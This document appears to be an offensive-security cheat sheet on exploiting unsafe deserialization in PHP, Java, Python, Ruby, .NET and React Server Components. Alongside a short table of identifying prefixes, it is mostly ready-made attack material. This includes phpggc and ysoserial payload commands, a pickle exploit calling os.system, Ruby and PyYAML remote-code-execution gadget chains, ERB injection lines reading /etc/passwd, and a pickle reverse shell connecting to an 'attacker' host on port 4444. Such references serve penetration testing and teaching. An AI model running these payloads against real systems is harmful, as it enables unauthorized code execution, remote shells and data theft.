# Deserialization Attacks

## Identification

| Indicator | Language | Format |
|---|---|---|
| `O:` prefix (e.g., `O:4:"User":2:{...}`) | PHP | serialize() |
| `rO0AB` base64 prefix | Java | ObjectInputStream |
| `aced0005` hex prefix | Java | ObjectInputStream (raw) |
| `gASV` base64 prefix | Python | pickle |
| `\x80\x04\x95` hex prefix | Python | pickle |
| JSON with `__proto__` or `constructor` | Node.js | prototype pollution |
| `AAEAAAD` base64 prefix | .NET | BinaryFormatter |
| `ViewState` in form fields | .NET | ObjectStateFormatter |

## PHP Deserialization

**When**: `unserialize()` is called on user-controlled input.

**How**: PHP objects have magic methods (`__wakeup`, `__destruct`,
`__toString`, `__call`) that execute automatically during
deserialization or garbage collection.

```php
// Vulnerable:
$obj = unserialize($_COOKIE['session']);

// Exploit: craft serialized object that triggers RCE via __destruct
// O:10:"LogManager":1:{s:4:"file";s:11:"/etc/passwd";}
```

**Gadget chains**: Use `phpggc` to generate payloads for common
frameworks:

```bash
phpggc Laravel/RCE1 system "id" -b  # base64 encoded
phpggc Symfony/RCE4 exec "id"
phpggc -l                           # list available chains
```

### Phar Deserialization

**When**: PHP processes a `phar://` URL on user-controlled path
(even in `file_exists()`, `is_file()`, etc.).

```bash
# Create malicious phar
php -d phar.readonly=0 create_phar.php
# Upload as .jpg (rename), access via: phar://uploads/evil.jpg
```

## Java Deserialization

**When**: `ObjectInputStream.readObject()` on user input.

**How**: Java classpath may contain "gadget classes" that chain
method calls during deserialization to achieve RCE.

```bash
# ysoserial — generate Java deserialize payloads
java -jar ysoserial.jar CommonsCollections1 "id" | base64

# Common gadget chains:
# CommonsCollections1-7 (Apache Commons Collections)
# Groovy1 (Groovy library)
# Spring1 (Spring Framework)
# JRMPClient (JRMP callback)
```

### Detection

```bash
# Check for Java serialized data
echo "<base64_data>" | base64 -d | xxd | head
# Look for: ACED 0005 (Java serialization magic bytes)
```

## Python Pickle

**When**: `pickle.loads()` on user-controlled input.

**How**: Pickle's `__reduce__` method allows arbitrary code execution
during deserialization.

```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
```

### Advanced Pickle

```python
# Reverse shell via pickle
class Exploit:
    def __reduce__(self):
        cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"
        return (os.system, (cmd,))
```

## Ruby Deserialization
**When**: `Marshal.load`, `YAML.load` (not `safe_load`), or ERB template deserialization on user input.

### Ruby YAML Unsafe Load
```yaml
# YAML payload for RCE via Gem::Installer
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: "id"
       method_id: :resolve
```

### Ruby Marshal RCE (Rails gadget)
```ruby
# Universal deserialize gadget chain (Rails apps with ActiveSupport)
# Use: ruby-deserialization-gadget-on-rails from httpvoid
# Generates Marshal payload that calls ERB#result → code execution
```

### Ruby ERB Template Injection
```ruby
<%= system('id') %>
<%= `id` %>
<%= File.read('/etc/passwd') %>
```

**Tool**: `phpggc` has Ruby chains. Check `PayloadsAllTheThings/Insecure Deserialization/Ruby.md` for current gadgets.

### YAML Deserialization (Python)

```yaml
# PyYAML unsafe load
!!python/object/apply:os.system ["id"]
!!python/object/new:subprocess.check_output [["id"]]
```

Use `yaml.safe_load()` is safe; `yaml.load()` or `yaml.unsafe_load()` is vulnerable.

## .NET Deserialization

**When**: `BinaryFormatter`, `ObjectStateFormatter`, `SoapFormatter`,
`NetDataContractSerializer`, or `JavaScriptSerializer` with
type resolver on user input.

```bash
# ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "id"
ysoserial.exe -f ObjectStateFormatter -g TextFormattingRunProperties -c "id"
```

### ViewState

If `__VIEWSTATE` is not encrypted and `MAC validation` is disabled
(or key is known), inject via ViewState deserialization.

## Node.js Prototype Pollution

Not traditional deserialization, but related — see
`prototype-pollution.md`.

## React Server Components (CVE-2025-55182)

**When**: Next.js / React app using React Server Components (RSC)
with the Flight protocol.

**How**: Send a crafted multipart form POST to any Server Action
endpoint. The Flight protocol's deserialization allows prototype
pollution via `__proto__` traversal to reach `Function` constructor,
achieving unauthenticated RCE.

- CVSS 10.0, no authentication required
- Single HTTP request, near-100% reliability
- Affects default `create-next-app` configurations
- Patched in React 19.1.0 and Next.js 15.3.3

```
POST /action HTTP/1.1
Content-Type: multipart/form-data; boundary=---
---
Content-Disposition: form-data; name="1_$ACTION_..."
{"__proto__": {"constructor": {"prototype": ...}}}
```
